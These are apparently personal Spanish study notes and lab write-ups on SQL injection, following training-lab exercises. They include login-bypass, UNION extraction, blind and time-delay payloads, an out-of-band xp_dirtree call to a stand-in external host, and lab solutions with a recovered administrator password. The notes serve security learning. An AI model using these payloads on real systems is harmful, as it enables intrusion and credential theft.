# SQLi (SQL inyection)

La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir en las consultas que una aplicación realiza a su base de datos. Esto le permite acceder a datos que normalmente no podría recuperar, como datos de otros usuarios o cualquier otro dato al que la aplicación tenga acceso. En muchos casos, el atacante puede modificar o eliminar estos datos, provocando cambios permanentes en el contenido o el comportamiento de la aplicación.

En algunos casos, un atacante puede intensificar un ataque de inyección SQL para comprometer el servidor subyacente u otra infraestructura de back-end. También puede permitirle realizar ataques de denegación de servicio.

## Cómo detectar vulnerabilidades de inyección SQL

Puedes detectar la inyección SQL de forma manual realizando un conjunto sistemático de pruebas contra cada punto de entrada (campos, formularios, parámetros) de la aplicación. Para hacer esto, normalmente deberías enviar:

- **El carácter de comilla simple `'`** y buscar errores u otras anomalías.

```
SELECT * FROM productos WHERE id_producto = ''';
``` 

>[!Note] A tener en cuenta
>Cuando se hace una consulta como esta en la base de datos, el texto se mete entre comillas **después** si esta configurado como un texto.

Si esto da error demuestra que la base de datos interpreta que se han cerrado las dos primeras comillas y ha quedado una tercera comilla sin cerrar. En vez de decirnos que el dato no es válido o algo similar, hemos interactuado con la base de datos, podemos interactuar de varias maneras, por lo que es vulnerable.

- **Sintaxis específica de SQL** que evalúe al valor base (original) del punto de entrada, y luego otra que evalúe a un valor diferente, para buscar diferencias sistemáticas en las respuestas de la aplicación.

```
WHERE id_producto = 2-1; Resultado= Laptop
WHERE id_producto = 3-1; Resultado= Ratón
```
Esto se hace para ver si la página te hace el cálculo matemático ya que sino fuera vulnerable no lo haría y te mostraría un mensaje diciendo que no se ha encontrado el producto "2-1".

- **Condiciones booleanas** como `OR 1=1` y `OR 1=2`, y buscar diferencias en las respuestas de la aplicación.

```
WHERE id_producto = 1 OR 1=1; Resultado= ignora el ID ya que siempre es correcto y muestra todos los productos.

WHERE id_producto = 1 OR 1=2; Resultado= es mentira por lo que la web vuelve a la normalidad y solo muestra el producto con ID=1.Esto se suele usar para comprobar si te da un resultado distinto.
```

(Si la página fuera no fuera vulnerable te mandaría un mensaje diciendo que no se ha encontrado el producto OR 1=1 o OR 1=2).

- **Payloads (cargas útiles) diseñados para provocar retrasos de tiempo (time delays)** cuando se ejecutan dentro de una consulta SQL, y buscar diferencias en el tiempo que tarda la aplicación en responder.

```
SELECT * FROM productos WHERE id_producto = 1; SELECT pg_sleep(10);

Si la página web tarda exactamente 10 segundos más de lo normal en terminar de cargar la base de datos es vulnerable y ejecutó la orden de dormir.
```

- **Payloads OAST** diseñados para provocar una interacción de red fuera de banda (out-of-band) cuando se ejecutan dentro de una consulta SQL, y monitorear cualquier interacción resultante.

**OAST (Out-of-band Application Security Testing):** Envían una carga maliciosa (_payload_) que obliga al servidor objetivo a realizar una petición saliente (como una consulta DNS o una solicitud HTTP) hacia un sistema externo.

**Confirmación:** Si el servidor externo registra esa llamada de retorno (_callback_), se confirma la existencia del fallo de manera fiable y sin falsos positivos evidentes.

```
Lo utilizamos para Microsoft SQL Server.

SELECT * FROM productos WHERE id_producto = 1; exec master..xp_dirtree '//://tu-servidor-de-burp.com';

```

La web en tu navegador no cambiará en absoluto (se verá normal). Sin embargo, abres la pestaña de `Burp Collaborator` y buscas si llegó una notificación de que la base de datos de la web intentó conectarse por la red a tu dirección `tu-servidor-de-burp.com`. Si aparece el registro, está confirmado.

## Inyección SQL en diferentes partes de la consulta

La mayoría de las vulnerabilidades de inyección SQL se producen dentro de la `WHERE`cláusula de una `SELECT`consulta. La mayoría de los probadores experimentados están familiarizados con este tipo de inyección SQL.

Sin embargo, las vulnerabilidades de inyección SQL pueden ocurrir en cualquier punto de la consulta y en diferentes tipos de consultas. Algunos otros lugares comunes donde surge la inyección SQL son:

- En `UPDATE`las declaraciones, dentro de los valores actualizados o la `WHERE`cláusula.
- En `INSERT`las declaraciones, dentro de los valores insertados.
- En `SELECT`las declaraciones, dentro del nombre de la tabla o columna.
- En `SELECT`las declaraciones, dentro de la `ORDER BY`cláusula.

## Ejemplos de inyección SQL

Existen numerosas vulnerabilidades, ataques y técnicas de inyección SQL que se presentan en diferentes situaciones. Algunos ejemplos comunes de inyección SQL incluyen:

- **Retrieving hidden data** (Recuperación de datos ocultos), donde puede modificar una consulta SQL para obtener resultados adicionales.
- **Subverting application logic** (Subvertir la lógica de la aplicación), donde se puede modificar una consulta para interferir con la lógica de la aplicación.
- **UNION attacks** (Ataques UNION), que permiten recuperar datos de diferentes tablas de la base de datos.
- **Blind SQL injection** (Inyección SQL ciega), en la que los resultados de una consulta que usted controla no se devuelven en las respuestas de la aplicación.

## <u> 1. Recuperación de datos ocultos </u>

Imagina una aplicación de compras que muestra productos en diferentes categorías. Cuando el usuario hace clic en la categoría **`Gifts`**, su navegador solicita la URL:

`https://insecure-website.com/products?category=Gifts`

Esto provoca que la aplicación realice una consulta SQL para recuperar los detalles de los productos relevantes de la base de datos:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Esta consulta SQL le pide a la base de datos que devuelva:

- todos los detalles ( `*`)
- de la `products`tabla
- donde `category`es`Gifts`
- y `released` es `1`.

La restricción `released = 1`se está utilizando para ocultar productos que no han sido lanzados. Podríamos suponer que para los productos no lanzados, `released = 0`.

La aplicación no implementa ninguna defensa contra ataques de inyección SQL. Esto significa que un atacante puede construir el siguiente ataque, por ejemplo:

`https://insecure-website.com/products?category=Gifts'--`

Esto da como resultado la consulta SQL:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

**Es fundamental tener en cuenta que `--`es un indicador de comentario en SQL**. Esto significa que el resto de la consulta se interpreta como un comentario, eliminándolo efectivamente. En este ejemplo, esto significa que la consulta ya no incluye `AND released = 1`. Como resultado, se muestran todos los productos, incluidos los que aún no se han lanzado.

Puedes usar un ataque similar para hacer que la aplicación muestre todos los productos de cualquier categoría, incluidas categorías que desconocen:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

Esto da como resultado la consulta SQL:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

La consulta modificada devuelve todos los elementos donde o bien `category`es `Gifts`, o bien `1`es igual a `1`. Como `1=1`siempre es verdadero, la consulta devuelve todos los elementos.

> [!WARNING] Advertencia de Seguridad: Inyección SQL (`OR 1=1`)
> Tenga mucho cuidado al insertar la condición `OR 1=1` en una consulta SQL. 
> 
> Aunque parezca inofensiva en el contexto original, es muy común que las aplicaciones utilicen datos de una misma solicitud en **varias consultas diferentes**.
> 
> Si su condición llega a una instrucción `UPDATE` o `DELETE`, puede provocar una **pérdida masiva o alteración accidental de datos**.



### LAB 1 Retrieval of hidden data ( recuperación de datos ocultos)

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Para resolver el laboratorio, realice un ataque de inyección SQL que provoque que la aplicación muestre uno o más productos no lanzados al mercado.

**Respuesta**

Lo primero que hacemos para ver si podemos interactuar con la base de datos es poner una comilla simple al final de la URL, nos da un error interno, por lo que si podemos.

Lo siguiente que hacemos es poner la instrucción `'OR+1=1--` después de `category =`.

Con esto hacemos lo siguiente: cerramos las comillas, lo siguiente es la igualdad `OR` que es una igualdad que siempre se cumple y por último al poner `--` le decimos que todo lo que sigue después de esa interacción no lo tenga en cuenta y que lo comente.

La base de datos recibiría esto:

`SELECT * FROM products WHERE category = ''OR 1=1--(a partir de aquí todo es un comentario)'`


## <u> 2. Subvertir la lógica de la aplicación </u>

Imagina una aplicación que permite a los usuarios iniciar sesión con un nombre de usuario y una contraseña. Si un usuario introduce el nombre de usuario `wiener`y la contraseña `bluecheese`, la aplicación verifica las credenciales ejecutando la siguiente consulta SQL:

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

Si la consulta devuelve los datos de un usuario, el inicio de sesión se considera exitoso. De lo contrario, se rechaza.

En este caso, un atacante puede iniciar sesión como cualquier usuario sin necesidad de contraseña. Puede hacerlo utilizando la secuencia de comentarios SQL `--`para eliminar la verificación de contraseña de la `WHERE`cláusula de la consulta. Por ejemplo, al introducir el nombre de usuario `administrator'--`y una contraseña en blanco, se obtiene la siguiente consulta:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

Esta consulta devuelve el usuario cuyo nombre `username`es `administrator`y logra que el atacante inicie sesión como ese usuario.

(En este ejemplo se entiende que obtienes el inicio de sesión porque la base de datos al devolverte una consulta con los datos del administrador la aplicación web confía en el criterio de la base de datos y te da el acceso).

### LAB 2 SQL injection vulnerability allowing login bypass

Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión.

Para resolver el laboratorio, realice un ataque de inyección SQL que inicie sesión en la aplicación como el `administrator`usuario.

**Respuesta**

En este laboratorio lo primero que he hecho ha sido entrar en la página de inicio de sesión donde me pedían el usuario y la contraseña.

En la parte de usuario he puesto:
`administrator`

En la parte de la contraseña he puesto:
`'OR 1=1--`

Al poner esto he conseguido resolver el laboratorio.

Al darle a ver la solución de la propia página me ha recomendado utilizar`Burp Suite`para resolver este laboratorio por lo que he procedido a instalarlo, la versión gratuita llamada`Burp Suite Community Edition`.

Una vez instalado me he dirigido a `Proxy`, `Intercept` y `Open Browser`.

En el navegador activamos `Intercept on` y en el navegador de `Port Swigger` ponemos el usuario `administrator` y la contraseña `holahola`, al darle a `Log in` podemos ver la petición `POST` que queremos enviar al navegador y podemos modificarla.

![[Pasted image 20260919014234.png]]

Cambiamos la parte del nombre de usuario: `username=administrator'--` dejamos lo demás igual, le damos a `Forward`y ponemos `Intercept off` para que cargue la página.

Al hacerlo podemos ver que el navegador nos ha iniciado sesión como administrador correctamente.

![[Pasted image 20260919014525.png]]

Creamos una base de datos para ver como sería de forma local en la base de datos de `MariaDB`.

![[Pasted image 20260920082127.png]]

Ponemos la condición booleana de `OR 1=1`pero esta vez cambiando un poco la sintaxis `OR 1=1; --';`. Esta vez no ponemos el guion antes y tenemos que poner `;`al acabar la igualdad y la sentencia.

También se puede poner el comentario como `#`.

![[Pasted image 20260920082456.png]]


## <u> 3. SQL injection UNION attacks </u>

Un **ataque de inyección SQL basado en UNION** ocurre cuando un atacante aprovecha una vulnerabilidad en una base de datos para combinar los resultados de la consulta legítima de la aplicación con los resultados de una nueva consulta maliciosa que él mismo introduce.

Este ataque aprovecha el canal de respuesta normal de la aplicación, haciendo que la base de datos muestre información confidencial directamente en la interfaz web.

### 1. El Concepto Clave: El Operador `UNION`
En SQL, la palabra clave `UNION` se utiliza para combinar el resultado de dos o más sentencias `SELECT` en un **único conjunto de resultados**.

### Ejemplo de flujo normal vs. atacado

*   **Consulta interna original (Mostrar productos):**
    ```sql
    SELECT nombre_producto, precio FROM productos WHERE categoria = 'Calzado';
    ```

*   **Consulta alterada por el atacante:**
    ```sql
    SELECT nombre_producto, precio FROM productos WHERE categoria = 'Calzado'
    UNION
    SELECT nombre_usuario, contraseña FROM usuarios;
    ```

> [!WARNING] Resultado
> La aplicación web, que originalmente solo iba a pintar zapatos y precios en la pantalla, terminará mostrando también los nombres de usuario y las contraseñas porque la base de datos le devolvió todo junto en un solo paquete.

### 2. Los Dos Requisitos Estrictos de `UNION`
Para que un ataque `UNION` tenga éxito, la consulta inyectada debe cumplir estrictamente con las reglas del lenguaje SQL. De lo contrario, la base de datos arrojará un error.

*   **Mismo número de columnas:** La consulta del atacante debe devolver exactamente la misma cantidad de columnas que la consulta original. Si la consulta original pide 2 columnas (`a, b`), la consulta inyectada debe pedir 2 columnas (`c, d`).
*   **Tipos de datos compatibles:** Los tipos de datos de las columnas deben ser compatibles en el mismo orden. Si la primera columna original es un texto (`String`) y la segunda es un número (`Integer`), la consulta inyectada debe mantener esa misma compatibilidad.

### 3. Fases del Ataque (Metodología)

Cuando un atacante descubre un parámetro vulnerable, sigue estos pasos para estructurar su inyección:

#### Paso A: Averiguar el número de columnas
El atacante debe determinar cuántas columnas tiene la consulta original utilizando dos métodos comunes:

1.  **Inyectar `ORDER BY`:** Va probando incrementalmente hasta que la página da un error:
    *   `ORDER BY 1`
    *   `ORDER BY 2`
    *   `ORDER BY 3` (Si funciona aquí pero falla en el 4, la consulta tiene 3 columnas).
2.  **Inyectar valores nulos:** Prueba combinaciones hasta que la página no devuelva error:
    *   `UNION SELECT NULL`
    *   `UNION SELECT NULL, NULL`

#### Paso B: Averiguar los tipos de datos de las columnas
Una vez determinado el número de columnas (por ejemplo, 3), debe encontrar cuál de ellas acepta texto para extraer la información. Va probando de forma secuencial:
*   `UNION SELECT 'un_texto', NULL, NULL`
*   `UNION SELECT NULL, 'un_texto', NULL`
*   `UNION SELECT NULL, NULL, 'un_texto'`


> [!WARNING] **Alertas de Sintaxis SQLi**
> * **Oracle:** Exige siempre `FROM`. Usa `FROM DUAL` al final para rellenar los `NULL`. (`DUAL`es la tabla comodín).
> * **MySQL (Espacios):** Los guiones `--` obligan a dejar un espacio al final (`-- ` o `--+`).
> * **MySQL (Atajo):** Puedes usar `#` para comentar sin preocuparte por los espacios.
> * **Otros (SQL Server/Postgres):** Aceptan el formato estándar con `--` directamente.

Ejemplo:

| Base de Datos | Comando (2 Columnas) |
| :--- | :--- |
| **MySQL** | `' UNION SELECT NULL, NULL#` |
| **Oracle** | `' UNION SELECT NULL, NULL FROM DUAL--` |
| **SQL Server / Postgres** | `' UNION SELECT NULL, NULL--` |

#### Paso C: Extraer la información útil
Cuando ya conoce las columnas idóneas, reemplaza los `NULL` por consultas a las tablas del sistema (como `information_schema` en MySQL) para listar las tablas y finalmente extraer las credenciales:
```sql
UNION SELECT username, password FROM users
```

#### Recuperación de múltiples valores dentro de una sola columna

En algunos casos, la consulta del ejemplo anterior puede devolver únicamente una sola columna.

Puedes recuperar múltiples valores juntos dentro de esta única columna concatenándolos. Es posible incluir un separador que te permita distinguir los valores combinados. Por ejemplo, en `Oracle` podrías enviar la siguiente entrada:

```sql
' UNION SELECT username || '~' || password FROM users--
```

Esto utiliza la secuencia de doble barra vertical `||`, que es el operador de concatenación de cadenas en `Oracle`. La consulta inyectada concatena los valores de los campos `username` y `password`, separados por el carácter `~`.

Los resultados de la consulta contendrán todos los nombres de usuario y contraseñas, por ejemplo:

```text
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Diferentes bases de datos utilizan una sintaxis distinta para realizar la concatenación de cadenas. Para obtener más detalles, consulta la guía de referencia rápida (*cheat sheet*) de inyección SQL.

`Cheat sheet:`

* **Oracle:** `'foo'||'bar'`
* **Microsoft:** `'foo'+'bar'`
* **PostgreSQL:** `'foo'||'bar'`
* **MySQL:** 
  * `'foo' 'bar'` *(Nota el espacio entre ambas cadenas)*
  * `CONCAT('foo','bar')`

## LAB 3 SQL injection UNION attack, determining the number of columns returned by the query

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas. El primer paso de dicho ataque es determinar el número de columnas que devuelve la consulta. Posteriormente, utilizará esta técnica en laboratorios posteriores para construir el ataque completo.

Para resolver el laboratorio, determine el número de columnas que devuelve la consulta realizando un ataque de inyección SQL UNION que devuelva una fila adicional con valores nulos.

**Respuesta**

![[Pasted image 20260920095004.png]]

En este laboratorio lo primero que haremos es irnos a una categoría, por ejemplo a la categoría `Gifts` después lo que haremos será descubrir de cuantas columnas está compuesta esta tabla. 

La URL es: `https://0af000e203e46b9b80923a06006400a2.web-security-academy.net/filter?category=Gifts`

Lo que haremos será añadir lo siguiente: `category=Gifts'ORDER BY 1 --`

Iremos aumentando el valor de `ORDER BY` hasta que nos de fallo para saber cuantas columnas tiene.

Llegamos a la conclusión que tiene 3 columnas.

Para resolver el laboratorio introducimos en la URL la instrucción `category=Gifts'UNION SELECT NULL, NULL, NULL --`

### LAB 4 SQL injection UNION attack, finding a column containing text

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, primero debe determinar el número de columnas que devuelve la consulta. Puede hacerlo utilizando una técnica aprendida en un laboratorio anterior. El siguiente paso es identificar una columna compatible con datos de tipo cadena.

El laboratorio te proporcionará un valor aleatorio que deberás insertar en los resultados de la consulta. Para resolver el laboratorio, realiza un ataque de inyección SQL UNION que devuelva una fila adicional con el valor proporcionado. Esta técnica te ayudará a determinar qué columnas son compatibles con datos de tipo cadena.

**Respuesta**

Como ya sabemos de antes ya que es la misma página, contamos con tres columnas.

Nos dan un texto `DBdrAQ` el cual corresponde al en una columna que no sabemos cual es por lo que vamos probando:

`https://0a91005c04618663806b2be50004009d.web-security-academy.net/filter?category=Pets' union select 'DBdrAQ', null,null--`

`https://0a91005c04618663806b2be50004009d.web-security-academy.net/filter?category=Pets' union select null, 'DBdrAQ',null--`

![[Pasted image 20260920134211.png]]

Lo encontramos al ponerlo en la segunda columna.

### LAB 5 SQL injection UNION attack, retrieving data from other tables

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, necesitas combinar algunas de las técnicas que aprendiste en laboratorios anteriores.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username`y `password`.
Para resolver el laboratorio, realice un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utilice esa información para iniciar sesión como el `administrator`usuario.

**Respuesta**

El enunciado nos dice que tenemos que extraer el nombre de usuario y contraseña de la tabla de `users`, comprobamos que la tabla donde nos encontramos en la `category` cuenta también con datos del mismo tipo.

`category=Pets' UNION SELECT 'a', 'a'--` nos carga perfectamente.

Procedemos a extraer los datos de la tabla `users`.

`'union select username, password from users --`

Si buscamos por la página web podemos ver que se han escrito los valores en algún lugar de la página, las credenciales que nos interesan son las de `administrator`.

![[Pasted image 20260920141446.png]]


### LAB 6 SQL injection UNION attack, retrieving multiple values in a single column

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede utilizar un ataque UNION para recuperar datos de otras tablas.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username`y `password`.

Para resolver el laboratorio, realice un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utilice esa información para iniciar sesión como el `administrator`usuario.

**Respuesta**

En esta ocasión la tabla que nos proporcionan tiene dos columnas, esto lo comprobamos con `ORDER BY`, después vemos que tipos de datos tienen con `' UNION SELECT "TEXTO", NULL --`
y `' UNION SELECT NULL, "TEXTO"`.

Nos da como resultado que la primera columna no es un texto pero la segunda si, por lo que para extraer la información ponemos:

`category = ' union select null, username || '~' || password from users --`

![[Pasted image 20260920193449.png]]

## <u> Examinando la base de datos en ataques de inyección SQL </u>

Para explotar las vulnerabilidades de inyección SQL, a menudo es necesario encontrar información sobre la base de datos. Esto incluye:

- El tipo y la versión del software de base de datos.
- Las tablas y columnas que contiene la base de datos.

## Consulta del tipo y versión de la base de datos

Es posible identificar tanto el tipo como la versión de la base de datos inyectando consultas específicas del proveedor para ver si alguna funciona.

A continuación se muestran algunas consultas para determinar la versión de la base de datos para algunos tipos de bases de datos populares:

|                       |                           |
| --------------------- | ------------------------- |
| Tipo de base de datos | Consulta                  |
| Microsoft, MySQL      | `SELECT @@version`        |
| Oracle                | `SELECT * FROM v$version` |
| PostgreSQL            | `SELECT version()`        |

Por ejemplo, podrías usar un `UNION`ataque con la siguiente entrada:

`' UNION SELECT @@version--`

Esto podría devolver el siguiente resultado. En este caso, puede confirmar que la base de datos es Microsoft SQL Server y ver la versión utilizada:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`

### LAB 7 SQL injection attack, querying the database type and version on MySQL and Microsoft

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Puedes usar un ataque UNION para recuperar los resultados de una consulta inyectada.

Para resolver el laboratorio, muestre la cadena de versión de la base de datos.

1. Averiguamos el número de columnas con `ORDER BY` pero nos damos cuenta que con la instrucción que ponemos siempre, el comentario `--` no funciona, por lo que probamos otras formas. Al final como funciona es con `' ORDER BY -- -` tiene que tener un espacio después y el comentario por lo que se trata de `MySQL` ya que tiene esa sintaxis (también podríamos hacerlo con `#` o `/*comentario*/.

Descubrimos que tiene 2 columnas `' ORDER BY 2 -- -` es la última sentencia que no nos da fallo.

2. Usamos `' UNION SELECT "TEXTO", NULL -- -` y `' UNION SELECT NULL, "TEXTO" -- -` vemos que las dos funcionan por lo que ambas aceptan texto.

3. Ponemos la sentencia `' UNION SELECT @@version, 'hola' -- -` y nos da la información que queremos.

![[Pasted image 20260920201446.png]]
### Listar el contenido de la base de datos

La mayoría de los tipos de bases de datos (excepto Oracle) tienen un conjunto de vistas llamado el esquema de información (*information schema*). Esto proporciona información sobre la base de datos.

Por ejemplo, puedes consultar `information_schema.tables` para listar las tablas de la base de datos:

```sql
SELECT * FROM information_schema.tables
```

Esto devuelve una salida como la siguiente:

```text
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Esta salida indica que hay tres tablas, llamadas *Products*, *Users* y *Feedback*.

A continuación, puedes consultar `information_schema.columns` para listar las columnas de tablas individuales:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Esto devuelve una salida como la siguiente:

```text
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Esta salida muestra las columnas de la tabla especificada y el tipo de datos de cada columna.

## <u> Como proceder a sacar toda la información desde el inicio </u>

BASES DE DATOS -> TABLAS -> COLUMNAS -> DATOS

Lo primero que hacemos es ver las bases de datos que tenemos creadas, esto se aplica para `MariaDB` que es la base de datos que estoy usando:

`show databases;`

1. Con esto nos muestra las **bases de datos** predeterminadas y las que hemos creado, las predeterminadas son:

`information_schema, performance_schema, mysql`

Lo siguiente que podemos hacer es ver que tablas tienen las bases de datos.

`show tables from information_schema`

2. Esto nos dará el listado de **tablas** de la base de datos `information_schema` que es donde se almacenan toda la estructura de la base de datos de `MariaDB`.

![[Pasted image 20260921111146.png]]

Unas de las tablas para nuestros ejercicios que más nos interesa son`TABLES` y `COLUMNS`.

3. Para ver las **columnas** que tiene por ejemplo la tabla `TABLES` podemos poner:

`describe information_schema.tables;` o simplemente `describe tables;` si estamos en la base de datos `information_schema`.

![[Pasted image 20260921111513.png]]

En esta **columna** de la tabla `TABLES` de `information_schema` vemos cosas interesantes como`TABLE_NAME` esto lo podemos utilizar para ver el nombre de todas las tablas que existen.

`select table_name from information_schema.tables where ...;`

4. Para ver las columnas que tiene la tabla `COLUMNS` podemos usar el comando:

`describe information_schema.columns;` o simplemente `describe columns;` si estamos en la base de datos `information_schema`.

![[Pasted image 20260921114501.png]]

Para ver el nombre de alguna columna podríamos usar:

`select column_name from information_schema.columns where ...;`

### LAB 8 SQL injection attack, listing the database contents on non-Oracle databases

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede utilizar un ataque UNION para recuperar datos de otras tablas.

La aplicación cuenta con una función de inicio de sesión y la base de datos contiene una tabla con nombres de usuario y contraseñas. Debes determinar el nombre de esta tabla y las columnas que contiene, para luego recuperar su contenido y obtener el nombre de usuario y la contraseña de todos los usuarios.

Para resolver el laboratorio, inicie sesión como `administrator`usuario.

**Respuesta**

- Lo primero que haremos es saber cuantas columnas estamos tratando con un `ORDER BY`:

`' order by 2 --` el la última consulta que no nos da error.

- Lo segundo es ver con que base de datos estamos tratando:

`' union select version(), null --`

Esto nos dice que es PostgreSQL 12.22 (Ubuntu...)

- Lo tercero es descubrir el nombre de tabla.

`' union select table_name, null from information_schema.tables --`

Obtenemos `users_lygwmg`

- Lo cuarto es descubrir el nombre de la columna:

`' unon select column_name, null from information_schema.columns where table_name = 'users_lygwmg' --`

Obtenemos `username_xdrowi` y `password_nibgrr`

- Lo último que queda es sacar la información de estas columnas:

`' union select username_xdrowi, password_nibgrr from users_lygwmg`

Obtenemos `administrator ocdim0qsho4b29kqu7by`

## <u>4. Blind SQL injection</u>

La inyección SQL ciega se produce cuando una aplicación es vulnerable a la inyección SQL, pero sus respuestas HTTP no contienen los resultados de la consulta SQL correspondiente ni los detalles de los errores de la base de datos.

Muchas técnicas, como los ataques `UNION`, no son efectivas contra las vulnerabilidades de inyección SQL ciega. Esto se debe a que dependen de poder ver los resultados de la consulta inyectada en las respuestas de la aplicación. Aún es posible explotar la inyección SQL ciega para acceder a datos no autorizados, pero se deben utilizar técnicas diferentes.

### <u>Explotación de la inyección SQL ciega mediante la activación de respuestas condicionales.</u>

Considera una aplicación que utiliza cookies de seguimiento para recopilar análisis sobre su uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Cuando se procesa una solicitud que contiene una cookie `TrackingId`, la aplicación utiliza una consulta SQL para determinar si se trata de un usuario conocido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a **inyección SQL**, pero los resultados de la consulta no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato o no. Si envías un `TrackingId` reconocido, la consulta devuelve datos y recibes un mensaje de *"Welcome back"* (Bienvenido de nuevo) en la respuesta.

Este comportamiento es suficiente para poder explotar la vulnerabilidad de **inyección SQL ciega**. Puedes recuperar información activando diferentes respuestas de forma condicional, dependiendo de la condición que inyectes.

Para entender cómo funciona este exploit, supongamos que se envían dos solicitudes consecutivas que contienen los siguientes valores en la cookie `TrackingId`:

```http
…xyz' AND '1'='1
…xyz' AND '1'='2
```

* **El primero de estos valores** hace que la consulta devuelva resultados, porque la condición inyectada `AND '1'='1` es verdadera. Como resultado, se muestra el mensaje *"Welcome back"*.
* **El segundo valor** hace que la consulta no devuelva ningún resultado, porque la condición inyectada es falsa. Por lo tanto, el mensaje *"Welcome back"* no se muestra.

Esto nos permite determinar la respuesta a cualquier condición individual que inyectemos y, de este modo, extraer información pieza por pieza (carácter por carácter).

Por ejemplo, supongamos que existe una tabla llamada `Users` con las columnas `Username` y `Password`, y un usuario llamado `Administrator`. Puedes determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña carácter por carácter.

Para hacer esto, comienza con la siguiente entrada:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Esto devuelve el mensaje *"Welcome back"*, lo que indica que la condición inyectada es verdadera y, por lo tanto, el primer carácter de la contraseña es mayor que la **`m`**.

A continuación, enviamos la siguiente entrada:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Esto no devuelve el mensaje *"Welcome back"*, lo que indica que la condición inyectada es falsa y, por lo tanto, el primer carácter de la contraseña no es mayor que la **`t`**.

Finalmente, enviamos la siguiente entrada, la cual sí devuelve el mensaje *"Welcome back"*, confirmando así que el primer carácter de la contraseña es la **`s`**:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Podemos continuar con este proceso para determinar de manera sistemática la contraseña completa del usuario `Administrator`.

> [!NOTE] Nota
> La función `SUBSTRING` se llama `SUBSTR` en algunos tipos de bases de datos. Para más detalles, consulta la guía rápida de inyección SQL (*SQL injection cheat sheet*).


`SUBSTRING("SQL", 1, 2)` Devuelve "SQ" (empieza en la 1 y toma 2 letras en total)

### <u>Burp Suite </u>

Para poder auditar y explotar vulnerabilidades web de forma eficiente, se recomienda usar `Burp Suite` como proxy interceptor para agilizar todo el trabajo con las peticiones HTTP/HTTPS.

#### 1. Configuración del Navegador Propio
Para trabajar desde nuestro navegador habitual (ej. Chrome, Edge, Brave) en lugar del navegador integrado de Burp Suite, debemos realizar dos configuraciones esenciales:

*   **FoxyProxy (Intercepción de Red):** Instalamos la extensión *FoxyProxy Standard*. Esta nos permite redirigir todo el tráfico de nuestro navegador hacia Burp Suite, situándolo como intermediario (Proxy). 
    *   *Configuración:* Se añade un nuevo proxy de tipo `HTTP`, apuntando a la dirección IP local `127.0.0.1` en el puerto `8080`.
*   **Certificado CA (Confianza HTTPS):** Como Burp actúa como un intermediario en conexiones cifradas (`https://`), el navegador bloqueará el tráfico por seguridad si no hacemos este paso. Debemos exportar el certificado en formato `.der` desde los ajustes internos de Burp Suite (`Settings` -> `Proxy listeners` -> `Import / export CA certificate`) e importarlo en la sección de seguridad de nuestro navegador (`chrome://settings/security`) dentro del apartado de **Certificados de confianza** (Autoridades). Esto le indica al navegador que confíe plenamente en Burp.

#### 2. Optimización del Entorno de Trabajo (Aislamiento de Tráfico)
Una vez que el tráfico fluye correctamente, el navegador generará mucho "ruido" visual debido a las peticiones automáticas de fondo (telemetría de Google, actualizaciones, etc.). Para no saturarnos, debemos filtrar los resultados recolectados combinando las herramientas **Target** y **Filter**.

##### 🎯 Target (Objetivo / Alcance)
